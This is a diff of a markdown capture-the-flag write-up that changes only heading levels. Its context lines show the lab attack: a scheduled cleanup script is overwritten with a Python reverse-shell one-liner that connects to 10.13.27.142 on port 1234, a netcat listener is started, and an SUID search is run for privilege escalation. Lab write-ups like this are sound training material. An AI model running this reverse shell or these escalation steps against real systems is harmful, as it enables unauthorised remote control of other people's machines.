@@ -218,7 +218,7 @@ Running cleanup script:  nothing to delete
 
 This confirms that the .sh file is running a scheduled task so, lets look into a possible reverse shell. 
 
-### Reverse Shell
+# Reverse Shell
 
 By going to Pentest Monkey (https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), I am able to find a few reverse shells. Lets see if we can get the python one to execute. 
 
@@ -227,7 +227,7 @@ I removed the content within the .sh and put the pentest monkey reverse shell in
 ```console
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.27.142",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
-# Netcat
+### Netcat
 Now start your NC Listener on port 1234 
 
 ```console
@@ -305,7 +305,7 @@ We also have a username of namelessone if that provise us information.
 
 sudo -l was also disabled, so lets run a search to see if we can find what SUID namelessone has permissiong to access.
 
-### Priveledge Escaltion
+# Priveledge Escaltion
 ```console
 find / -perm -u=s -type f 2>/dev/null  
 find / -perm -u=s -type f 2>/dev/null  
